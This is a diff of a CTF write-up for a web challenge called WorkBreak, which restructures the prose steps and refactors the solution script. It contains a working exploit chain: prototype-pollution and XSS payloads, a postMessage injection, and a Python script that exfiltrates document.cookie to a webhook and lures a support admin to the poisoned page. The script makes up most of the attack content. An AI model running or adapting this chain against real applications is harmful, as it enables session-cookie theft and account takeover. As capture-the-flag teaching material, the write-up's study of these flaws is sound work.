@@ -266,18 +266,21 @@ if __name__ == "__main__":
 
 The goal is to exploit an XSS vulnerability on the challenge domain and leverage it to exfiltrate the session cookie of the support engineer.
 
-### Exploitation Steps
+### TLDR
 
-1. **User Creation and Traffic Analysis**:
-    - Create a user in the WorkBreak application.
-    - Analyze the HTTP traffic and identify the endpoints `/api/user/profile` and `/api/user/settings` used to retrieve and submit profile information.
-2. **Identifying Vulnerabilities**:
-    - Notice that data submitted via the `/api/user/settings` endpoint is reflected under the `"dynamicInfo"` key in the JSON response from the `/api/user/profile` endpoint, indicating a potential mass assignment vulnerability.
-3. **Reviewing `performance_chart.js`**:
-    - Understand the script consumes a `tasks` JSON array, with objects having `tasksCompleted` and `date` keys.
-    - The `tasksCompleted` key is inserted into the sink via the `.html()` method of the D3.js library.
+First, we created an account on WorkBreak and started monitoring the traffic. Through this analysis, we found two important API endpoints:
+- `/api/user/profile` - Gets profile data
+- `/api/user/settings` - Updates profile settings
+
+Looking deeper at how these endpoints interact, we discovered something interesting: data we send to `/api/user/settings` shows up in the `dynamicInfo` field when we fetch from `/api/user/profile`. This hints at a possible mass assignment vulnerability.
+
+Next, we examined `performance_chart.js`. This script processes task data that comes in a JSON array format. Each task object contains two fields:
+- `tasksCompleted`
+- `date`
+
+The script uses D3.js library's `.html()` method to render the `tasksCompleted` value, which will lead to an XSS vector since it's directly inserting HTML.
     
-    ```javascript
+```javascript
     const taskCounts = generateTaskHeatmapData(taskData);
     const today = new Date().toISOString().split("T")[0];
     const todayTask = taskData.find((task) => task.date === today);
@@ -287,36 +290,16 @@ The goal is to exploit an XSS vulnerability on the challenge domain and leverage
     } else {
         todayTasksDiv.html("Tasks Completed Today: 0");
     }
-    
-    ```
-    
-4. **Crafting Initial XSS Payload**:JSON
-    - Attempt to exploit XSS by injecting a payload into `tasksCompleted` JSON key with today’s date.
-    
-    ```json
-    {
-        "name": "zzzzz",
-        "phone": "",
-        "position": "",
-        "tasks": [
-            {
-                "date": "YYYY-MM-DD",
-                "tasksCompleted": "<img/src/onerror=alert()>"
-            }
-        ]
-    }
-    
-    ```
-    
-    - Receive response: `"error": "Not Allowed to Modify Tasks"`
-5. **Bypassing Input Validation**:
-    - Notice potential prototype pollution vulnerability in `profile.js` script.
-    
-    `const userSettings = Object.assign({ name: "", phone: "", position: "" }, profileData.dynamicInfo);`
-    
-    - Craft payload using prototype pollution:
-    
-    ```json
+```
+
+also there's a prototype pollution vulnerability in `profile.js` script.
+
+```javascript   
+const userSettings = Object.assign({ name: "", phone: "", position: "" }, profileData.dynamicInfo);
+```
+this is out payload payload 
+
+```json
     {
         "name": "zzzzzz",
         "phone": "",
@@ -325,19 +308,19 @@ The goal is to exploit an XSS vulnerability on the challenge domain and leverage
             "tasks": [
                 {
                     "date": "YYYY-MM-DD",
-                    "tasksCompleted": "<img/src/onerror=alert()>"
+                    "tasksCompleted": "<img/src/onerror=alert(origin)>"
                 }
             ]
         }
     }
     
-    ```
+```
     
-    - Inject payload successfully but origin is 'null' due to sandbox iframe.
-6. **Finding Another Sink**:
-    - Review `profile.js` script for another exploitable sink.
-    
-    ```javascript
+we successfully popped the alert but origin is 'null' due to sandbox iframe.
+
+Secondary XSS Vector (profile.js):
+
+```javascript
     window.addEventListener(
         "message",
         (event) => {
@@ -348,20 +331,18 @@ The goal is to exploit an XSS vulnerability on the challenge domain and leverage
         },
         false
     );
+// Unsafe innerHTML with user-controlled data
+ ```
     
-    ```
+finally Send postMessage to EventListener to exploit the second XSS vulnerability:
     
-    - Send postMessage to EventListener to exploit the second XSS vulnerability:
-    
-    ```
+```javascript
     (async () => {
-        parent.postMessage({ totalTasks: "<img/src/onerror=eval(atob(<ENCODED_PAYLOAD>))>" }, "*");
+        parent.postMessage({ totalTasks: "<img/src/onerror=eval(atob(payloadb64))>" }, "*");
     })();
     
-    ```
+```
     
-7. **Crafting the Final Payload**:
-    - Combine all vulnerabilities to craft a payload for exfiltrating the session cookie of the support engineer.
 
 ### Solution Script
 
@@ -369,39 +350,104 @@ The goal is to exploit an XSS vulnerability on the challenge domain and leverage
 import httpx
 import base64
 import datetime
+from typing import Optional
 
-DOMAIN = ""  
-WEBHOOK = "" 
+class WorkBreakExploit:
+    def __init__(self, domain: str, webhook: str):
+        self.domain = domain
+        self.webhook = webhook
+        self.client: Optional[httpx.AsyncClient] = None
+        self.sid: Optional[str] = None
 
-# Get a session
-async with httpx.AsyncClient() as client:
-    await client.post(f"http://{DOMAIN}/api/auth/signup", json={"email": "zwx@xin.cn", "password": "zz1337"})
-    login_res = await client.post(f"http://{DOMAIN}/api/auth/login", json={"email": "zwx@xin.cn", "password": "zz1337"}, follow_redirects=False)
-    sid = login_res.cookies.get("SID")
-    print(f"[+] session retrieved successfully: {sid}")
+    async def __aenter__(self):
+        self.client = httpx.AsyncClient()
+        return self
 
-    extract_flag = "(async () => {await fetch(`https://" + WEBHOOK + "/?${document.cookie}`);})();"
-    post_message_payload = f"(async () => {{parent.postMessage({{\"totalTasks\":\"<img/src/onerror=eval(atob('{base64.b64encode(extract_flag.encode('utf-8')).decode()}'))>\"}},'*');}})()"
-    payload = {
-        "name": "Anon",
-        "phone": "",
-        "position": "",
-        "__proto__": {
-            "tasks": [
-                {
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        if self.client:
+            await self.client.aclose()
+
+    async def create_session(self, email: str = "zwx@xin.cn", password: str = "zz1337") -> None:
+        """Create user session and store SID"""
+        await self.client.post(
+            f"http://{self.domain}/api/auth/signup",
+            json={"email": email, "password": password}
+        )
+        login_res = await self.client.post(
+            f"http://{self.domain}/api/auth/login",
+            json={"email": email, "password": password},
+            follow_redirects=False
+        )
+        self.sid = login_res.cookies.get("SID")
+        print(f"[+] session retrieved successfully: {self.sid}")
+
+    def craft_xss_payload(self) -> dict:
+        """Create the XSS payload with prototype pollution"""
+        extract_flag = f"(async()=>{{await fetch(`https://{self.webhook}/?${{document.cookie}}`);}})()"
+        post_message = (
+            f"(async()=>{{parent.postMessage({{\"totalTasks\":\""
+            f"<img/src/onerror=eval(atob('{base64.b64encode(extract_flag.encode()).decode()}'))>\"}}"
+            f",'*');}})()"
+        )
+        
+        return {
+            "name": "Anon",
+            "phone": "",
+            "position": "",
+            "__proto__": {
+                "tasks": [{
                     "date": datetime.date.today().strftime("%Y-%m-%d"),
-                    "tasksCompleted": f"<img/src/onerror=eval(atob(\"{base64.b64encode(post_message_payload.encode('utf-8')).decode()}\"))>",
-                }
-            ]
-        },
-    }
-    await client.post(f"http://{DOMAIN}/api/user/settings", headers={"Cookie": f"SID={sid}"}, json=payload)
-    print("[+] payload has been persisted!")
-    uuid_res = await client.get(f"http://{DOMAIN}/", headers={"Cookie": f"SID={sid}"}, follow_redirects=False)
-    await client.post(f"http://{DOMAIN}/api/support/chat", headers={"Cookie": f"SID={sid}"}, json={"message":f"http://{DOMAIN}{uuid_res.headers['Location']}"})
-    print("[+] admin exploited - check the collaborator")
-```
+                    "tasksCompleted": f"<img/src/onerror=eval(atob(\"{base64.b64encode(post_message.encode()).decode()}\"))>",
+                }]
+            }
+        }
 
+    async def inject_payload(self) -> None:
+        """Inject the XSS payload"""
+        headers = {"Cookie": f"SID={self.sid}"}
+        payload = self.craft_xss_payload()
+        
+        await self.client.post(
+            f"http://{self.domain}/api/user/settings",
+            headers=headers,
+            json=payload
+        )
+        print("[+] payload has been persisted!")
+
+    async def trigger_admin_visit(self) -> None:
+        """Trigger admin visit to exploit page"""
+        headers = {"Cookie": f"SID={self.sid}"}
+        uuid_res = await self.client.get(
+            f"http://{self.domain}/",
+            headers=headers,
+            follow_redirects=False
+        )
+        
+        await self.client.post(
+            f"http://{self.domain}/api/support/chat",
+            headers=headers,
+            json={"message": f"http://{self.domain}{uuid_res.headers['Location']}"}
+        )
+        print("[+] admin exploited - check the collaborator")
+
+    async def execute(self) -> None:
+        """Execute the full exploit chain"""
+        await self.create_session()
+        await self.inject_payload()
+        await self.trigger_admin_visit()
+
+async def main():
+    domain = ""  # Add target domain
+    webhook = "" # Add webhook URL
+    
+    async with WorkBreakExploit(domain, webhook) as exploit:
+        await exploit.execute()
+
+if __name__ == "__main__":
+    import asyncio
+    asyncio.run(main())
+```
+it was a nice chain
 
 # Biocorp - A simple XEE 
 
